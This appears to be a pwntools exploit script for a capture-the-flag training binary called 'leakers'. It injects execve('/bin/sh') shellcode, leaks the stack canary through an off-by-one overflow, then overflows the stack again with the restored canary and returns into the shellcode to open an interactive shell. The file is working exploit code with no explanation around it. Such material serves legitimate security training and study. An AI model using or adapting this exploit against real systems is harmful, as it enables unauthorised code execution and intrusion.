from pwn import *
import sys
import time

context.arch = 'amd64'

if(len(sys.argv) > 1):
	if(sys.argv[1] == '--debug'):
		p = process("./leakers")
		gdb.attach(p, """
		b *main+252
		call (long)mprotect(0x000000404000, 0x1000, 0x7)
		"""	)
		input("wait...")
	elif(sys.argv[1] == '--strace'):
		p = process(["strace", "./leakers"])
	elif(sys.argv[1] == '--remote'):
		p = remote("bin.training.offdef.it", 2010)
else:
	p = process("./leakers")

asm_code = """
lea rax, [rip]
add rax, 0x16
mov rdi, rax
mov rax, 0x3b
xor rsi, rsi
xor rdx, rdx
syscall
.string "/bin/sh"
"""

sh = asm(asm_code)

p.sendline(sh)
time.sleep(0.1)

p.send(b'A'*104 + b'B')
p.recvuntil(b'B')

canary = u64(b"\x00" + p.recv(7))
print('leak canary: %#x' % canary)

p.send(b'A'*104 + p64(canary) + b'A'*8 + p64(0x00404080))

time.sleep(0.1)
p.sendline()

p.interactive()